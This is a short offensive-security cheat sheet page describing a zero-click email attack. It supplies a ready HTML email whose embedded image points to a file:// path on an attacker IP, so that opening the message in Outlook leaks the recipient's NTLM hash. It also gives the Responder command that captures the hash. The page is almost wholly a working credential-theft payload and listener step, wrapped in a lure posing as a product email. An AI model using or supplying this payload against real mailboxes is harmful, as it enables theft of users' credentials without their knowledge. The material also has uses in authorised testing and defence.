# 🧘♂ 0-Click Email Attack

## HTML Email (To grab the user's NTLM hash when he/she opens the outlook email)

{% hint style="info" %}
If the mail is send by an trusted user then the victim donot need to open any links that is embed in the email.
{% endhint %}



```
<!DOCTYPE html>
<html>
<head>
</head>
<body>
    <p>
        Hi Person, <br/>
        I just wanted to write you an email to show you our really cool
        product: <img src="file://192.168.159.149/anything" />
        <br/>
        Thanks,
        Mantis,
    </p>
</body>
</html>
```



## Start Responder

```
python3 Responder.py -I 192.168.159.149
```

